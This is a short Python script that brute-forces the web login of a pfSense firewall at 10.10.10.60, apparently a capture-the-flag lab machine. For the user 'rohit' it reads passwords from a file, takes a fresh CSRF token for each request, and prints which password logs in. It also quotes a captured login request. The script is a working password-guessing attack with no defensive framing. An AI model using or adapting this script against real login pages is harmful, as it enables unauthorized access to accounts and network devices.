import requests
import re
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


'''
POST /index.php HTTP/1.1
Host: 10.10.10.60
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 123
Origin: https://10.10.10.60
Connection: close
Referer: https://10.10.10.60/index.php
Cookie: cookie_test=1606939285; PHPSESSID=02e574d29d8c3b215a211e9f584b843f
Upgrade-Insecure-Requests: 1

__csrf_magic=sid%3Aa592331eb61bb7473e3bdad6d7d530a5a937e510%2C1606935685&usernamefld=rohit&passwordfld=pfsensee&login=Login

csrfMagicToken = "sid:9d4360619013a2f82a240f279efd0fb86b60bb59,1606935709"
'''


"""
This code will pass the csrf token and the cookie with each request will thorrow to the server.
"""

re_csrf = 'csrfMagicToken = "(.*?)"'
s = requests.session()
with open('password.txt') as f:
    for password in f:

        # Navigating the index.php, to get the csrf + cookie to add them to the next POST request
        r = s.get('https://10.10.10.60/index.php', verify=False)
        csrf = re.findall(re_csrf, r.text)[0]
        login = {
            '__csrf_magic': csrf, 'usernamefld': 'rohit', 'passwordfld': password, 'login': 'Login'
        }

        # The second POST request after adding the csrf and the all required fields
        r = s.post('https://10.10.10.60/index.php', data=login)

        # Testing all provided password and sending a success or failure message on to the screen.
        if "Dashboard" in r.text:
            print("Valid Login {}:{}".format('rohit', password))
        else:
            print("Failed {}:{}".format('rohit', password))
            s.cookies.clear()
        #print(r.text)